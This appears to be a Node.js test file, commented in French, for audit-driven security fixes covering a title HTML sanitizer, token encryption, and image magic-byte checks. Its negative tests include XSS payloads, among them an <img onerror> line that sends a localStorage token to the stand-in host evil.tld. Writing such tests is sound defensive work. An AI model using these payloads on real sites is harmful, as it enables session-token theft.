// tests/security-utils.test.js — tests des correctifs de sécurité (AUDIT #2/#3/#5)
// Tests négatifs XSS + chiffrement tokens + sniff image. Zéro dépendance DB.
const { test, describe } = require('node:test');
const assert = require('node:assert/strict');

const { sanitizeTitleHtml } = require('../src/lib/sanitize-title-html');
const { sniffImage } = require('../src/lib/image-sniff');

// token-crypto dérive sa clé de JWT_SECRET s'il n'y a pas de clé dédiée.
process.env.JWT_SECRET = process.env.JWT_SECRET || 'test_jwt_secret_at_least_thirty_two_chars_xx';
const { encryptToken, decryptToken } = require('../src/lib/token-crypto');

describe('sanitizeTitleHtml — allowlist stricte (AUDIT #2)', () => {
  test('autorise <span class="it"> légitime', () => {
    const out = sanitizeTitleHtml('Tour <span class="it">de l\'Avesnois</span>');
    assert.equal(out, 'Tour <span class="it">de l&#39;Avesnois</span>');
  });

  test('neutralise <img onerror> (payload de l\'audit)', () => {
    const out = sanitizeTitleHtml("<img src=x onerror=fetch('https://evil.tld/?c='+localStorage.getItem('ccs_at'))>");
    assert.ok(!/<img/i.test(out), 'aucune balise img ne doit survivre');
    assert.ok(!/onerror/i.test(out) || /&lt;img/.test(out), 'le tag doit être échappé');
    assert.ok(out.startsWith('&lt;img'), 'le < doit être échappé en &lt;');
  });

  test('neutralise <script>', () => {
    const out = sanitizeTitleHtml('<script>alert(1)</script>');
    assert.ok(!/<script>/i.test(out));
    assert.ok(out.includes('&lt;script&gt;'));
  });

  test('rejette un span avec une autre classe/attribut', () => {
    const out = sanitizeTitleHtml('<span class="evil" onclick="x">hi</span>');
    assert.ok(!out.includes('<span class="evil"'), 'seul class="it" est autorisé');
    assert.ok(out.includes('&lt;span'));
  });

  test('tronque à 250 caractères', () => {
    const out = sanitizeTitleHtml('a'.repeat(500));
    assert.ok(out.length <= 250);
  });

  test('renvoie null pour vide/null', () => {
    assert.equal(sanitizeTitleHtml(null), null);
    assert.equal(sanitizeTitleHtml('   '), null);
  });
});

describe('token-crypto — AES-256-GCM (AUDIT #5)', () => {
  test('round-trip encrypt/decrypt', () => {
    const t = 'a1b2c3d4e5f6_strava_access_token';
    const enc = encryptToken(t);
    assert.ok(enc.startsWith('enc:v1:'), 'doit être préfixé');
    assert.notEqual(enc, t, 'le chiffré doit différer du clair');
    assert.equal(decryptToken(enc), t);
  });

  test('rétro-compatible : valeur en clair renvoyée telle quelle', () => {
    assert.equal(decryptToken('token_en_clair_pre_correctif'), 'token_en_clair_pre_correctif');
  });

  test('IV aléatoire : deux chiffrés du même clair diffèrent', () => {
    assert.notEqual(encryptToken('x'), encryptToken('x'));
  });

  test('null et chaîne vide inchangés', () => {
    assert.equal(encryptToken(null), null);
    assert.equal(encryptToken(''), '');
  });
});

describe('sniffImage — magic bytes (AUDIT #3)', () => {
  test('reconnaît un PNG réel', () => {
    const png = Buffer.from([0x89,0x50,0x4e,0x47,0x0d,0x0a,0x1a,0x0a, 0,0,0,0]);
    assert.deepEqual(sniffImage(png), { mime: 'image/png', ext: '.png' });
  });

  test('reconnaît un JPEG réel', () => {
    const jpg = Buffer.from([0xff,0xd8,0xff,0xe0, 0,0,0,0,0,0,0,0]);
    assert.deepEqual(sniffImage(jpg), { mime: 'image/jpeg', ext: '.jpg' });
  });

  test('rejette un SVG (payload XSS déguisé en image/png)', () => {
    const svg = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>');
    assert.equal(sniffImage(svg), null);
  });

  test('rejette un buffer trop court', () => {
    assert.equal(sniffImage(Buffer.from([0xff,0xd8])), null);
  });
});
